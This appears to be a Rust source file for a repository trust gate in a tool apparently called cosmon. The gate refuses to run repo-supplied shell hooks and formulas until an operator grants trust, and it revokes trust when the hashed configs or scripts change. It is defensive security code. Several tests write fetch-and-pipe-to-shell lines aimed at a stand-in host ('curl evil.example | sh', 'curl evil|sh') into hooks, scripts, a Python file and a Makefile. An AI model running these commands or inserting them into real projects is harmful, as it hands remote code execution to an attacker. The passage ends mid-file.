// SPDX-License-Identifier: AGPL-3.0-only

//! Repo-supplied shell trust gate — the `direnv allow` of cosmon (B5).
//!
//! # The hole this closes (RCE-by-clone)
//!
//! Cosmon executes shell strings **supplied by the repository it is pointed
//! at**: a formula's `command` / `verification.criteria` steps
//! (`cmd/evolve.rs`, `cmd/tackle.rs`, `cmd/verify.rs`) and the
//! `post_merge` / `pre_done` hooks in `.cosmon/config.toml` (`cmd/done.rs`).
//! All of those run via `sh -c` against strings the repo ships. Clone a
//! hostile repository, `cs tackle` / `cs done` it, and its `.cosmon/`
//! runs arbitrary code on your machine — no prompt, no grant, nothing.
//!
//! Detecting a *malicious* formula is undecidable (Rice's theorem), so this
//! module does not try. It follows the `direnv allow` model instead: a
//! one-bit, per-repository, human-granted trust marker recorded **outside**
//! the repo. Until the operator vouches for a repository once (`cs trust`),
//! cosmon **refuses** to run any shell string that repository supplies.
//!
//! # Why the grant lives outside the repo
//!
//! The trust record is stored in a global store (`~/.cosmon/trust/`), never
//! inside `.cosmon/`. A grant kept in-tree could be *shipped by the clone
//! itself* — the attacker would simply commit their own `.trusted` file and
//! the gate would be a no-op. Keying the grant on the repository's absolute
//! path, in a store the clone cannot write during `git clone`, is what makes
//! the marker unforgeable-by-clone.
//!
//! # Staleness (surface re-validation)
//!
//! Like `direnv` re-prompting when `.envrc` changes, a grant records a BLAKE3
//! hash of the repo's *shell surface* — its `.cosmon/config.toml` and every
//! `.cosmon/formulas/*.toml`. If that surface changes after trust was granted
//! (e.g. a `git pull` lands a new hostile `post_merge` hook), the grant reads
//! as `TrustStatus::Stale` and the operator must re-grant. This is a
//! conservative superset: a docstring-only formula edit also re-prompts. For
//! a security gate, fail-closed-on-change is the correct bias.
//!
//! # Delegated script targets (the fix-2 hole)
//!
//! Hashing only `config.toml` + `formulas/*.toml` covers the *pointer* but not
//! the *target* when the shell surface delegates: `post_merge = "bash
//! scripts/deploy.sh"`, a gate `build_command = "python ci/build.py"`, a
//! formula `command = "./gate.sh"`. The pointer never changes while the pointed-
//! at script is rewritten — so a grant would keep reading `TrustStatus::Trusted`
//! while the code that actually runs was swapped under it. That is a full
//! RCE-by-clone bypass of the gate.
//!
//! The surface hash therefore also folds in every **delegated target**: any
//! path token in the surface text that resolves to a regular file **inside the
//! repository root** is read and hashed too (its repo-relative path *and* its
//! bytes). Extraction is language-agnostic — a `.sh`, `.py`, `.js`, `.rb`,
//! `Makefile`, or any other referenced file is caught the same way, closing the
//! mixed-language `build_command` gap. Bare build-tool invocations that read an
//! *implicit* default file (`make` → `Makefile`, `just` → `justfile`) also pin
//! that default. This is one hop deep by design: a delegated script that itself
//! `source`s a third file is out of scope (documented residual), the same
//! conservative boundary the module already takes elsewhere.
//!
//! # Fail-closed hashing (unconditional jail)
//!
//! Every file that feeds the surface hash is folded **unconditionally** and
//! **fail-closed**: a surface file that exists but cannot be read contributes a
//! distinct `READ-ERROR` sentinel, never silently-empty bytes — so an attacker
//! who can toggle a referenced file's readability between hash time and exec
//! time cannot make a hostile target hash identically to a benign empty one.
//! Delegated-target resolution is *jailed* to the repository root: a token that
//! canonicalizes outside the repo (an absolute `/tmp/…` path, an escaping
//! symlink) is never hashed, because its contents cannot be shipped by the
//! clone and belong to a different (local-attacker) threat model.
//!
//! The same clone-shippability test excludes **ignored-and-untracked** files
//! (runtime state, build artifacts): `git clone` never materializes them, so
//! they are not part of the clone-supplied surface — and they mutate locally
//! all the time. Without this exclusion the gate self-destructs: formula
//! documentation that merely *mentions* `.cosmon/state/events.jsonl` (a live
//! append-only event log) pulled that log into the hash, and since every `cs`
//! invocation appends to it — including `cs trust` itself — a grant went stale
//! the instant it was written. A *tracked* file stays in the surface even when
//! an ignore rule matches it (`git add -f` ships with the clone), so an
//! attacker cannot hide a hostile delegated script behind their own
//! `.gitignore` entry.
//!
//! # Scope boundary (honest limits)
//!
//! This is a *trust* gate, not a *sandbox*. It governs whether cosmon will run
//! repo-supplied shell **at all**; it does not confine what a trusted command
//! can then do (SECURITY.md's unconfined-shell model still applies). The
//! surface is hashed from the resolved main-repo root, so a linked worktree
//! whose formulas diverge from main within an already-trusted repo is out of
//! scope — that is the operator's own repo mutating its own checkouts, not the
//! clone-level threat this gate exists to stop.

use std::path::{Path, PathBuf};
use std::process::Command;

/// Env var: when truthy (`1` / `true` / `yes`), the trust gate is bypassed.
///
/// The documented CI / automation escape hatch: a pipeline that has vetted
/// the repository out-of-band (it built it, it pinned the commit) can opt out
/// of the interactive-grant requirement without a writable trust store. It is
/// deliberately loud in name — setting it is an explicit "I vouch for this".
pub const ASSUME_TRUSTED_ENV: &str = "COSMON_ASSUME_TRUSTED";

/// Env var: overrides the global trust-store directory (default
/// `~/.cosmon/trust`). Used by tests to run hermetically and by operators who
/// relocate cosmon's home.
pub const TRUST_DIR_ENV: &str = "COSMON_TRUST_DIR";

/// Trust status of a repository w.r.t. its repo-supplied shell surface.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum TrustStatus {
    /// A grant exists and the recorded surface hash matches the current one.
    Trusted,
    /// No grant on record for this repository.
    Untrusted,
    /// A grant exists but the shell surface changed since it was granted
    /// (editing `.cosmon/config.toml` or a formula revokes the grant, exactly
    /// as editing `.envrc` revokes a `direnv allow`).
    Stale,
}

/// Is the environment bypass set to a truthy value?
fn assume_trusted() -> bool {
    matches!(
        std::env::var(ASSUME_TRUSTED_ENV).ok().as_deref(),
        Some("1" | "true" | "yes" | "TRUE" | "YES")
    )
}

/// Resolve the global trust-store directory.
///
/// Honors [`TRUST_DIR_ENV`]; otherwise `~/.cosmon/trust`. Falls back to a
/// relative `.cosmon/trust` only when no home directory can be resolved (a
/// degenerate environment) — in that case the gate still fails closed because
/// no grant will be found there.
#[must_use]
pub fn store_dir() -> PathBuf {
    if let Some(dir) = std::env::var_os(TRUST_DIR_ENV) {
        if !dir.is_empty() {
            return PathBuf::from(dir);
        }
    }
    match dirs::home_dir() {
        Some(home) => home.join(".cosmon").join("trust"),
        None => PathBuf::from(".cosmon").join("trust"),
    }
}

/// Resolve the stable trust key-root for `start`: the **main** git worktree
/// root, so every linked worktree of a repository shares one trust grant.
///
/// Uses `git rev-parse --git-common-dir` (worktree-stable — from a linked
/// worktree it points at the *main* repo's `.git`) and returns its parent.
/// Returns `None` when `start` is not inside a git repository; callers then
/// fall back to a canonicalized path (see `key_root_or_fallback`).
pub fn repo_key_root(start: &Path) -> Option<PathBuf> {
    let out = Command::new("git")
        .arg("-C")
        .arg(start)
        .args(["rev-parse", "--git-common-dir"])
        .output()
        .ok()?;
    if !out.status.success() {
        return None;
    }
    let raw = String::from_utf8_lossy(&out.stdout).trim().to_owned();
    if raw.is_empty() {
        return None;
    }
    let common = PathBuf::from(&raw);
    // `--git-common-dir` may be relative to `start` (main worktree prints
    // `.git`) or absolute (a linked worktree prints `<main>/.git`).
    let common_abs = if common.is_absolute() {
        common
    } else {
        start.join(common)
    };
    let common_abs = common_abs.canonicalize().unwrap_or(common_abs);
    common_abs.parent().map(Path::to_path_buf)
}

/// The trust key-root, or a canonicalized fallback when `start` is not in a
/// git repo. The fallback keeps the gate well-defined (fail-closed) for
/// non-git project directories instead of silently trusting them.
fn key_root_or_fallback(start: &Path) -> PathBuf {
    repo_key_root(start)
        .unwrap_or_else(|| start.canonicalize().unwrap_or_else(|_| start.to_owned()))
}

/// Fold one file into the surface accumulator, framed and **fail-closed**.
///
/// Every entry is `domain\0name\0status\0len\0bytes`, so neither a rename, a
/// byte-boundary shuffle, nor a primary-vs-delegated cross-collision can make
/// two distinct surfaces hash alike. `status` is `OK` when the bytes were read
/// and `ERR` when the file exists but the read failed — an unreadable file
/// therefore hashes distinctly from a readable empty one (the unconditional
/// fail-closed rule), instead of the old `unwrap_or_default()` fail-open.
fn fold_file(acc: &mut Vec<u8>, domain: u8, name: &str, content: std::io::Result<Vec<u8>>) {
    let (status, bytes): (&[u8], Vec<u8>) = match content {
        Ok(b) => (b"OK", b),
        Err(_) => (b"ERR", Vec::new()),
    };
    acc.push(domain);
    acc.push(0);
    acc.extend_from_slice(name.as_bytes());
    acc.push(0);
    acc.extend_from_slice(status);
    acc.push(0);
    acc.extend_from_slice(bytes.len().to_le_bytes().as_slice());
    acc.push(0);
    acc.extend_from_slice(&bytes);
}

/// Split surface text into candidate path tokens. Conservative: over-splitting
/// only *widens* the candidate set, and a superset is safe here — the risk this
/// gate must never take is *missing* a delegated target, never catching an
/// extra one (an extra token simply resolves to no file and is dropped).
fn path_tokens(text: &str) -> impl Iterator<Item = &str> {
    text.split(|c: char| {
        c.is_whitespace()
            || matches!(
                c,
                '"' | '\''
                    | '`'
                    | ';'
                    | '&'
                    | '|'
                    | '('
                    | ')'
                    | '<'
                    | '>'
                    | '{'
                    | '}'
                    | '='
                    | ','
                    | ':'
                    | '\\'
            )
    })
    .filter(|t| !t.is_empty())
}

/// Build-tools that read an *implicit* default file when invoked bare. A gate
/// of `build_command = "make"` runs `Makefile`; the bare token names no path,
/// so we pin the default explicitly. Keeps the mixed-language coverage honest
/// for the common `make` / `just` cases without trying to model every tool.
const IMPLICIT_DEFAULTS: &[(&str, &[&str])] = &[
    ("make", &["Makefile", "makefile", "GNUmakefile"]),
    ("gmake", &["Makefile", "makefile", "GNUmakefile"]),
    ("just", &["justfile", "Justfile", ".justfile"]),
];

/// The subset of `rels` (paths relative to `key_root`) that git reports as
/// **ignored and untracked** — files a `git clone` of this repository would
/// never materialize. Those are excluded from the surface hash (see the
/// module docs): they cannot carry clone-shipped code, and they mutate locally
/// (runtime state such as `.cosmon/state/events.jsonl`, build artifacts), so
/// folding them makes every grant self-stale.
///
/// Uses `git ls-files -o -i --exclude-standard` restricted to the candidate
/// paths: `-o` (others) limits the answer to *untracked* files, `-i` to
/// *ignored* ones — a tracked file matched by an ignore rule (`git add -f`)
/// is NOT listed and therefore stays in the surface. Each candidate is passed
/// as a `:(literal)` pathspec so glob characters in a path cannot widen the
/// match. On any git failure (not a repo, git missing) nothing is excluded —
/// the fail-closed direction for a security gate is to hash *more*.
fn clone_invisible(key_root: &Path, rels: &[String]) -> std::collections::HashSet<String> {
    let mut out = std::collections::HashSet::new();
    if rels.is_empty() {
        return out;
    }
    let mut cmd = Command::new("git");
    cmd.arg("-C")
        .arg(key_root)
        .args(["ls-files", "-z", "-o", "-i", "--exclude-standard", "--"]);
    for rel in rels {
        cmd.arg(format!(":(literal){rel}"));
    }
    let Ok(listing) = cmd.output() else {
        return out;
    };
    if !listing.status.success() {
        return out;
    }
    for chunk in listing.stdout.split(|b| *b == 0) {
        if !chunk.is_empty() {
            out.insert(String::from_utf8_lossy(chunk).into_owned());
        }
    }
    out
}

/// Resolve the set of **delegated target files** referenced by the surface
/// text: path tokens (and implicit build-tool defaults) that canonicalize to a
/// regular file **inside** `key_root`, excluding the primary surface files
/// themselves (already hashed) and files a clone would not ship (see
/// [`clone_invisible`]). Returned sorted by repo-relative path and
/// deduped, so the digest is deterministic regardless of scan order.
///
/// The jail is load-bearing: a token that canonicalizes outside `key_root`
/// (absolute `/tmp/…`, an escaping symlink) is dropped — its bytes cannot be
/// shipped by a clone, so it is not part of this threat model.
fn delegated_targets(key_root: &Path, primary: &[PathBuf], surface_text: &str) -> Vec<PathBuf> {
    let root_canon = key_root
        .canonicalize()
        .unwrap_or_else(|_| key_root.to_owned());
    let primary_canon: std::collections::HashSet<PathBuf> = primary
        .iter()
        .map(|p| p.canonicalize().unwrap_or_else(|_| p.clone()))
        .collect();

    // Candidate raw paths: every path token, plus implicit build-tool defaults
    // for any bare tool token present in the surface.
    let mut candidates: Vec<PathBuf> = Vec::new();
    for tok in path_tokens(surface_text) {
        candidates.push(key_root.join(tok));
        for (tool, defaults) in IMPLICIT_DEFAULTS {
            if tok == *tool {
                for d in *defaults {
                    candidates.push(key_root.join(d));
                }
            }
        }
    }

    let mut resolved: Vec<(String, PathBuf)> = Vec::new();
    let mut seen: std::collections::HashSet<PathBuf> = std::collections::HashSet::new();
    for cand in candidates {
        // Token names no existing file — drop it.
        let Ok(canon) = cand.canonicalize() else {
            continue;
        };
        if !canon.is_file() {
            continue; // directories and specials are not delegated scripts.
        }
        if !canon.starts_with(&root_canon) {
            continue; // jailed out — target escapes the repo root.
        }
        if primary_canon.contains(&canon) {
            continue; // already folded as a primary surface file.
        }
        if !seen.insert(canon.clone()) {
            continue; // dedupe distinct tokens pointing at the same file.
        }
        let rel = canon
            .strip_prefix(&root_canon)
            .unwrap_or(&canon)
            .to_string_lossy()
            .into_owned();
        resolved.push((rel, canon));
    }
    let rels: Vec<String> = resolved.iter().map(|(r, _)| r.clone()).collect();
    let invisible = clone_invisible(&root_canon, &rels);
    resolved.retain(|(rel, _)| !invisible.contains(rel));
    resolved.sort_by(|a, b| a.0.cmp(&b.0));
    resolved.into_iter().map(|(_, p)| p).collect()
}

/// BLAKE3 hex of the repository's *shell surface*: `.cosmon/config.toml`, every
/// `.cosmon/formulas/*.toml`, **and every delegated target file** those two
/// reference (scripts of any language, plus implicit `make`/`just` defaults),
/// in a deterministic order. This is the complete set of bytes that can inject
/// a `sh -c` string. Missing files are skipped (a repo with no config/formulas
/// hashes to a stable empty-surface digest); unreadable files fold a distinct
/// fail-closed sentinel (see [`fold_file`]).
fn surface_hash(key_root: &Path) -> String {
    let cosmon = key_root.join(".cosmon");
    let mut primary: Vec<PathBuf> = Vec::new();

    let config = cosmon.join("config.toml");
    if config.is_file() {
        primary.push(config);
    }
    let formulas = cosmon.join("formulas");
    if formulas.is_dir() {
        if let Ok(entries) = std::fs::read_dir(&formulas) {
            let mut formula_files: Vec<PathBuf> = entries
                .flatten()
                .map(|e| e.path())
                .filter(|p| p.is_file() && p.extension().and_then(|s| s.to_str()) == Some("toml"))
                .collect();
            formula_files.sort();
            primary.extend(formula_files);
        }
    }

    // Read the primary files once: their bytes feed the hash directly and their
    // text is scanned for delegated targets.
    let mut acc: Vec<u8> = Vec::new();
    let mut surface_text = String::new();
    for f in &primary {
        let name = f
            .file_name()
            .map(|n| n.to_string_lossy().into_owned())
            .unwrap_or_default();
        let content = std::fs::read(f);
        if let Ok(bytes) = &content {
            surface_text.push_str(&String::from_utf8_lossy(bytes));
            surface_text.push('\n');
        }
        fold_file(&mut acc, b'P', &name, content);
    }

    // Fold every delegated target (repo-relative path as the name, so two
    // scripts with the same basename in different dirs cannot collide).
    for target in delegated_targets(key_root, &primary, &surface_text) {
        let rel = target
            .strip_prefix(key_root.canonicalize().as_deref().unwrap_or(key_root))
            .unwrap_or(&target)
            .to_string_lossy()
            .into_owned();
        let content = std::fs::read(&target);
        fold_file(&mut acc, b'D', &rel, content);
    }

    cosmon_hash::Hash::of_bytes(&acc).to_hex()
}

/// Path of the grant file for `key_root` inside `store`: the store dir plus a
/// filename derived from BLAKE3 of the root's absolute path. Keying on the
/// path (not on repo contents) means one grant per repository location.
fn grant_file(store: &Path, key_root: &Path) -> PathBuf {
    let path_bytes = key_root.to_string_lossy();
    let key = cosmon_hash::Hash::of_bytes(path_bytes.as_bytes()).to_hex();
    store.join(format!("{key}.trust"))
}

/// Evaluate the trust status of the repository containing `start`, reading
/// grants from `store`. Pure w.r.t. process env (takes `store` explicitly) so
/// tests run hermetically without racing on a shared env var.
#[must_use]
pub fn evaluate(start: &Path, store: &Path) -> TrustStatus {
    let key_root = key_root_or_fallback(start);
    let grant = grant_file(store, &key_root);
    let recorded = match std::fs::read_to_string(&grant) {
        Ok(s) => s.trim().to_owned(),
        Err(_) => return TrustStatus::Untrusted,
    };
    if recorded == surface_hash(&key_root) {
        TrustStatus::Trusted
    } else {
        TrustStatus::Stale
    }
}

/// Record a trust grant for the repository containing `start` into `store`,
/// pinning the current shell-surface hash. Idempotent: re-granting simply
/// rewrites the recorded hash (the way to re-bless a [`TrustStatus::Stale`]
/// repo). Returns the key-root that was trusted.
pub fn grant(start: &Path, store: &Path) -> std::io::Result<PathBuf> {
    let key_root = key_root_or_fallback(start);
    std::fs::create_dir_all(store)?;
    let grant = grant_file(store, &key_root);
    std::fs::write(&grant, format!("{}\n", surface_hash(&key_root)))?;
    Ok(key_root)
}

/// Remove any trust grant for the repository containing `start` from `store`.
/// Returns `true` if a grant existed and was removed, `false` if there was
/// nothing to revoke. Returns the resolved key-root alongside for reporting.
pub fn revoke(start: &Path, store: &Path) -> std::io::Result<(PathBuf, bool)> {
    let key_root = key_root_or_fallback(start);
    let grant = grant_file(store, &key_root);
    match std::fs::remove_file(&grant) {
        Ok(()) => Ok((key_root, true)),
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok((key_root, false)),
        Err(e) => Err(e),
    }
}

/// Convenience wrapper over [`evaluate`] that resolves the default
/// [`store_dir`] and honors the [`ASSUME_TRUSTED_ENV`] bypass (bypass always
/// reads [`TrustStatus::Trusted`]).
#[must_use]
pub fn status(start: &Path) -> TrustStatus {
    if assume_trusted() {
        return TrustStatus::Trusted;
    }
    evaluate(start, &store_dir())
}

/// The hot-path gate: call **immediately before** running any repo-supplied
/// shell string. Returns `Ok(())` when the repository is trusted (or the
/// bypass is set) and a descriptive error otherwise, so callers can `?` it in
/// front of a `Command::new("sh")`.
///
/// The error text tells the operator exactly how to grant trust; it is the
/// only place the gate speaks to a human, so it carries the full rationale.
pub fn ensure_trusted(start: &Path) -> anyhow::Result<()> {
    match status(start) {
        TrustStatus::Trusted => Ok(()),
        TrustStatus::Untrusted => {
            let root = key_root_or_fallback(start);
            anyhow::bail!(untrusted_message(&root));
        }
        TrustStatus::Stale => {
            let root = key_root_or_fallback(start);
            anyhow::bail!(stale_message(&root));
        }
    }
}

/// Operator-facing refusal for an untrusted repository.
fn untrusted_message(root: &Path) -> String {
    format!(
        "refusing to run repo-supplied shell — repository not trusted.\n\
         \n  cosmon runs shell strings this repository supplies (formula \
         `command`/`verification` steps and the `post_merge`/`pre_done` hooks \
         in .cosmon/config.toml). A freshly-cloned repository could otherwise \
         run arbitrary code on your machine the moment you tackle or merge it.\n\
         \n  If you trust this repository, grant it once:\n\
         \n      cs trust            # from anywhere inside the repo\n\
         \n  For CI or a vetted automated context, set {ASSUME_TRUSTED_ENV}=1.\n\
         \n  repository: {}",
        root.display()
    )
}

/// Operator-facing refusal for a stale grant (surface changed since trust).
fn stale_message(root: &Path) -> String {
    format!(
        "repository trust is stale — its shell surface changed since you \
         granted trust\n  (.cosmon/config.toml or .cosmon/formulas/* were \
         modified). Re-review the change, then re-grant:\n\
         \n      cs trust\n\
         \n  repository: {}",
        root.display()
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    /// A minimal git repo with a `.cosmon/` shell surface, so the gate keys on
    /// a real main-worktree root exactly as it does in production.
    fn make_repo(dir: &Path, hook: &str) {
        let git = |args: &[&str]| {
            let ok = Command::new("git")
                .arg("-C")
                .arg(dir)
                .args(args)
                .output()
                .expect("git");
            assert!(ok.status.success(), "git {args:?}");
        };
        git(&["init", "-q", "-b", "main"]);
        let cosmon = dir.join(".cosmon");
        std::fs::create_dir_all(cosmon.join("formulas")).unwrap();
        std::fs::write(
            cosmon.join("config.toml"),
            format!("[hooks]\npost_merge = '{hook}'\n"),
        )
        .unwrap();
    }

    #[test]
    fn untrusted_repo_refuses() {
        let repo = tempfile::tempdir().unwrap();
        let store = tempfile::tempdir().unwrap();
        make_repo(repo.path(), "echo hi");
        assert_eq!(
            evaluate(repo.path(), store.path()),
            TrustStatus::Untrusted,
            "a fresh clone must be untrusted"
        );
    }

    #[test]
    fn grant_then_trusted() {
        let repo = tempfile::tempdir().unwrap();
        let store = tempfile::tempdir().unwrap();
        make_repo(repo.path(), "echo hi");
        grant(repo.path(), store.path()).unwrap();
        assert_eq!(
            evaluate(repo.path(), store.path()),
            TrustStatus::Trusted,
            "an explicitly granted repo runs"
        );
    }

    #[test]
    fn surface_change_goes_stale() {
        let repo = tempfile::tempdir().unwrap();
        let store = tempfile::tempdir().unwrap();
        make_repo(repo.path(), "echo hi");
        grant(repo.path(), store.path()).unwrap();
        // Mutate the shell surface — as a hostile `git pull` would.
        std::fs::write(
            repo.path().join(".cosmon").join("config.toml"),
            "[hooks]\npost_merge = 'curl evil.example | sh'\n",
        )
        .unwrap();
        assert_eq!(
            evaluate(repo.path(), store.path()),
            TrustStatus::Stale,
            "a changed shell surface must revoke trust"
        );
    }

    #[test]
    fn revoke_returns_to_untrusted() {
        let repo = tempfile::tempdir().unwrap();
        let store = tempfile::tempdir().unwrap();
        make_repo(repo.path(), "echo hi");
        grant(repo.path(), store.path()).unwrap();
        let (_root, removed) = revoke(repo.path(), store.path()).unwrap();
        assert!(removed, "revoke reports it removed the grant");
        assert_eq!(evaluate(repo.path(), store.path()), TrustStatus::Untrusted);
        let (_root, removed_again) = revoke(repo.path(), store.path()).unwrap();
        assert!(!removed_again, "second revoke is a no-op");
    }

    #[test]
    fn linked_worktree_shares_the_grant() {
        // Trust granted from the main worktree must cover a linked worktree,
        // because a worker's `cs evolve` runs inside `.worktrees/<mol>/`.
        let repo = tempfile::tempdir().unwrap();
        let store = tempfile::tempdir().unwrap();
        make_repo(repo.path(), "echo hi");
        // A commit is required before `git worktree add`.
        let git = |args: &[&str]| {
            Command::new("git")
                .arg("-C")
                .arg(repo.path())
                .args(args)
                .output()
                .expect("git")
        };
        git(&["config", "user.email", "t@example.com"]);
        git(&["config", "user.name", "t"]);
        git(&["add", "-A"]);
        git(&["commit", "-q", "-m", "init", "--no-gpg-sign"]);
        let wt = repo.path().join(".worktrees").join("m1");
        let out = git(&[
            "worktree",
            "add",
            "-q",
            wt.to_str().unwrap(),
            "-b",
            "feat/m1",
        ]);
        assert!(out.status.success(), "worktree add");

        grant(repo.path(), store.path()).unwrap();
        assert_eq!(
            evaluate(&wt, store.path()),
            TrustStatus::Trusted,
            "the linked worktree inherits the main repo's trust"
        );
    }

    /// Commit helper so `evaluate`/`grant` key on a real git-common-dir root
    /// (the delegated-target tests write scripts under that same root).
    fn git_commit_all(dir: &Path) {
        let git = |args: &[&str]| {
            Command::new("git")
                .arg("-C")
                .arg(dir)
                .args(args)
                .output()
                .expect("git")
        };
        git(&["config", "user.email", "t@example.com"]);
        git(&["config", "user.name", "t"]);
        git(&["add", "-A"]);
        git(&["commit", "-q", "-m", "init", "--no-gpg-sign"]);
    }

    /// The core fix-2 hole: a hook that *delegates* to a script must go stale
    /// when the script's bytes change, even though the pointer (config.toml)
    /// is byte-identical. Before the delegated-target hash this stayed Trusted.
    #[test]
    fn delegated_script_edit_goes_stale() {
        let repo = tempfile::tempdir().unwrap();
        let store = tempfile::tempdir().unwrap();
        make_repo(repo.path(), "bash scripts/deploy.sh");
        let scripts = repo.path().join("scripts");
        std::fs::create_dir_all(&scripts).unwrap();
        std::fs::write(scripts.join("deploy.sh"), "#!/bin/bash\necho benign\n").unwrap();
        git_commit_all(repo.path());

        grant(repo.path(), store.path()).unwrap();
        assert_eq!(evaluate(repo.path(), store.path()), TrustStatus::Trusted);

        // Rewrite ONLY the delegated target — config.toml is untouched.
        std::fs::write(
            scripts.join("deploy.sh"),
            "#!/bin/bash\ncurl evil.example | sh\n",
        )
        .unwrap();
        assert_eq!(
            evaluate(repo.path(), store.path()),
            TrustStatus::Stale,
            "editing a delegated script must revoke trust"
        );
    }

    /// Mixed-language coverage: the delegated target is a Python build script
    /// named by a `[gates] build_command`, not a shell script. It must be
    /// hashed the same way — the extractor is language-agnostic.
    #[test]
    fn mixed_language_build_command_target_goes_stale() {
        let repo = tempfile::tempdir().unwrap();
        let store = tempfile::tempdir().unwrap();
        // A config whose gate delegates to a python script.
        let cosmon = repo.path().join(".cosmon");
        std::fs::create_dir_all(cosmon.join("formulas")).unwrap();
        std::fs::write(
            cosmon.join("config.toml"),
            "[gates]\nbuild_command = \"python ci/build.py\"\n",
        )
        .unwrap();
        Command::new("git")
            .arg("-C")
            .arg(repo.path())
            .args(["init", "-q", "-b", "main"])
            .output()
            .unwrap();
        let ci = repo.path().join("ci");
        std::fs::create_dir_all(&ci).unwrap();
        std::fs::write(ci.join("build.py"), "print('benign')\n").unwrap();
        git_commit_all(repo.path());

        grant(repo.path(), store.path()).unwrap();
        assert_eq!(evaluate(repo.path(), store.path()), TrustStatus::Trusted);

        std::fs::write(
            ci.join("build.py"),
            "import os; os.system('curl evil|sh')\n",
        )
        .unwrap();
        assert_eq!(
            evaluate(repo.path(), store.path()),
            TrustStatus::Stale,
            "editing a python build_command target must revoke trust"
        );
    }

    /// Absent → present of a delegated target flips the grant stale: planting a
    /// script the (unchanged) config already references changes the surface.
    #[test]
    fn planting_referenced_script_goes_stale() {
        let repo = tempfile::tempdir().unwrap();
        let store = tempfile::tempdir().unwrap();
        make_repo(repo.path(), "bash scripts/deploy.sh");
        git_commit_all(repo.path());
        // Grant while scripts/deploy.sh does NOT yet exist.
        grant(repo.path(), store.path()).unwrap();
        assert_eq!(evaluate(repo.path(), store.path()), TrustStatus::Trusted);

        let scripts = repo.path().join("scripts");
        std::fs::create_dir_all(&scripts).unwrap();
        std::fs::write(scripts.join("deploy.sh"), "curl evil.example | sh\n").unwrap();
        assert_eq!(
            evaluate(repo.path(), store.path()),
            TrustStatus::Stale,
            "planting a referenced-but-absent script must revoke trust"
        );
    }

    /// The jail: a token that resolves *outside* the repo (an absolute path) is
    /// never hashed, so editing it does not affect trust — it is a different
    /// (local-attacker) threat model, and resolution must not panic.
    #[test]
    fn out_of_repo_target_is_jailed_out() {
        let repo = tempfile::tempdir().unwrap();
        let outside = tempfile::tempdir().unwrap();
        let store = tempfile::tempdir().unwrap();
        let ext = outside.path().join("evil.sh");
        std::fs::write(&ext, "echo one\n").unwrap();
        make_repo(repo.path(), &format!("bash {}", ext.display()));
        git_commit_all(repo.path());

        grant(repo.path(), store.path()).unwrap();
        assert_eq!(evaluate(repo.path(), store.path()), TrustStatus::Trusted);

        // Editing the out-of-repo file must NOT change trust (jailed out).
        std::fs::write(&ext, "echo two\n").unwrap();
        assert_eq!(
            evaluate(repo.path(), store.path()),
            TrustStatus::Trusted,
            "a target outside the repo root is not part of the surface"
        );
    }

    /// Implicit build-tool default: a bare `make` gate pins `Makefile` even
    /// though no path token names it.
    #[test]
    fn implicit_makefile_default_goes_stale() {
        let repo = tempfile::tempdir().unwrap();
        let store = tempfile::tempdir().unwrap();
        let cosmon = repo.path().join(".cosmon");
        std::fs::create_dir_all(cosmon.join("formulas")).unwrap();
        std::fs::write(
            cosmon.join("config.toml"),
            "[gates]\nbuild_command = \"make\"\n",
        )
        .unwrap();
        Command::new("git")
            .arg("-C")
            .arg(repo.path())
            .args(["init", "-q", "-b", "main"])
            .output()
            .unwrap();
        std::fs::write(repo.path().join("Makefile"), "all:\n\techo benign\n").unwrap();
        git_commit_all(repo.path());

        grant(repo.path(), store.path()).unwrap();
        assert_eq!(evaluate(repo.path(), store.path()), TrustStatus::Trusted);

        std::fs::write(repo.path().join("Makefile"), "all:\n\tcurl evil|sh\n").unwrap();
        assert_eq!(
            evaluate(repo.path(), store.path()),
            TrustStatus::Stale,
            "editing the implicit Makefile default must revoke trust"
        );
    }

    /// Regression (task-20260716-8985): a formula that merely *mentions* a
    /// gitignored runtime file (`.cosmon/state/events.jsonl` — the live event
    /// log every `cs` invocation appends to) must NOT pull that file into the
    /// surface hash. Before this exclusion a grant went stale the instant it
    /// was written, and the `cs done` post-merge gate rolled back every merge.
    #[test]
    fn ignored_untracked_runtime_file_does_not_self_stale() {
        let repo = tempfile::tempdir().unwrap();
        let store = tempfile::tempdir().unwrap();
        make_repo(repo.path(), "echo hi");
        // A formula whose *documentation* names the runtime event log.
        std::fs::write(
            repo.path().join(".cosmon/formulas/review.formula.toml"),
            "# Reads .cosmon/state/events.jsonl for timing.\n\
             [[steps]]\ncommand = 'echo review'\n",
        )
        .unwrap();
        std::fs::write(repo.path().join(".gitignore"), ".cosmon/state/\n").unwrap();
        let state = repo.path().join(".cosmon/state");
        std::fs::create_dir_all(&state).unwrap();
        std::fs::write(state.join("events.jsonl"), "{\"ev\":1}\n").unwrap();
        git_commit_all(repo.path());

        grant(repo.path(), store.path()).unwrap();
        // The log grows — as it does on every single cs invocation.
        std::fs::write(state.join("events.jsonl"), "{\"ev\":1}\n{\"ev\":2}\n").unwrap();
        assert_eq!(
            evaluate(repo.path(), store.path()),
            TrustStatus::Trusted,
            "an ignored, untracked runtime file must not feed the surface hash"
        );
    }

    /// The counter-hole: an attacker cannot hide a hostile delegated script
    /// from the hash by shipping their own `.gitignore` rule for it — a
    /// *tracked* file (force-added) is materialized by `git clone` no matter
    /// what ignore rules say, so it stays in the surface.
    #[test]
    fn tracked_but_ignored_script_still_goes_stale() {
        let repo = tempfile::tempdir().unwrap();
        let store = tempfile::tempdir().unwrap();
        make_repo(repo.path(), "bash scripts/deploy.sh");
        std::fs::write(repo.path().join(".gitignore"), "scripts/\n").unwrap();
        let scripts = repo.path().join("scripts");
        std::fs::create_dir_all(&scripts).unwrap();
        std::fs::write(scripts.join("deploy.sh"), "echo benign\n").unwrap();
        git_commit_all(repo.path());
        // Force-track the ignored script — it ships with any clone.
        let out = Command::new("git")
            .arg("-C")
            .arg(repo.path())
            .args(["add", "-f", "scripts/deploy.sh"])
            .output()
            .expect("git add -f");
        assert!(out.status.success());
        let out = Command::new("git")
            .arg("-C")
            .arg(repo.path())
            .args(["commit", "-q", "-m", "track", "--no-gpg-sign"])
            .output()
            .expect("git commit");
        assert!(out.status.success());

        grant(repo.path(), store.path()).unwrap();
        assert_eq!(evaluate(repo.path(), store.path()), TrustStatus::Trusted);

        std::fs::write(scripts.join("deploy.sh"), "curl evil.example | sh\n").unwrap();
        assert_eq!(
            evaluate(repo.path(), store.path()),
            TrustStatus::Stale,
            "a tracked (clone-shipped) script stays in the surface even when ignored"
        );
    }

    #[test]
